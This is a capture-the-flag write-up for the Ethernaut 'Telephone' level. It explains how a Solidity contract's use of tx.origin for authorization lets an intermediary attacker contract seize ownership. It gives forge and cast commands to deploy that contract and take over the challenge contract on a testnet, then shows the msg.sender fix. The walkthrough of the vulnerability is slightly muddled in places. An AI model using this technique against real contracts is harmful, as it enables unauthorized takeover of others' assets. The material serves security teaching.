> **⚠️ EDUCATIONAL PURPOSE ONLY**
> This document is part of the [Ethernaut CTF](https://ethernaut.openzeppelin.com/) educational security challenges.
> The techniques described here are for **authorized security testing and learning purposes only**.
> **DO NOT** use these methods on contracts you don't own or without explicit authorization.

---

# Level 3 - Telephone

## Objective

Claim ownership of the contract.

## Challenge Address

```
0x38aEee0A4739157ae1E62B893ac77e4E2E8C4428
```


## Vulnerability

### Problem

Contract uses `tx.origin` instead of `msg.sender` for authorization checks.

Key differences:
- `tx.origin`: The original EOA that started the transaction chain
- `msg.sender`: The immediate caller of the current function

An attacker contract can intercept calls, changing `msg.sender` but NOT `tx.origin`.

### Why It's Vulnerable

```solidity
require(tx.origin == owner);  // ❌ WRONG
```

If your wallet is the owner:
1. You call `TelephoneAttacker.attack()`
2. TelephoneAttacker calls `Telephone.changeOwner()`
3. Inside Telephone:
   - `msg.sender` = TelephoneAttacker (the contract)
   - `tx.origin` = YOUR wallet (the original sender)
4. Check passes because `tx.origin == owner` (your wallet)!

## Attack Algorithm

### Step 1: Deploy Attacker Contract

```bash
source .env
forge script script/levels/03_Telephone/DeployTelephoneAttacker.s.sol:DeployTelephoneAttacker \
  --rpc-url $SEPOLIA_RPC_URL \
  --private-key $PRIVATE_KEY \
  --broadcast
```

Save the deployed address from output.

### Step 2: Execute Attack

Call `attack()` with your wallet address:

```bash
cast send 0x<ATTACKER_ADDRESS> \
  "attack(address)" 0x<YOUR_WALLET> \
  --rpc-url $SEPOLIA_RPC_URL \
  --private-key $PRIVATE_KEY
```

Or use the script:

```bash
bash script/levels/03_Telephone/attack.sh 0x<ATTACKER_ADDRESS>
```

### Step 3: Verify

```bash
cast call 0x38aEee0A4739157ae1E62B893ac77e4E2E8C4428 "owner()" --rpc-url $SEPOLIA_RPC_URL
```

Should return your wallet address.

## How to Fix

**Always use `msg.sender`**, never `tx.origin` for access control:

```solidity
// ❌ WRONG
require(tx.origin == owner);

// ✅ CORRECT
require(msg.sender == owner);
```

`tx.origin` remains the transaction originator through the entire call stack. It should never be used for authorization.

## Key Takeaway

`tx.origin` is **not** secure for access control. It represents the wallet that initiated the transaction, not the current contract caller.
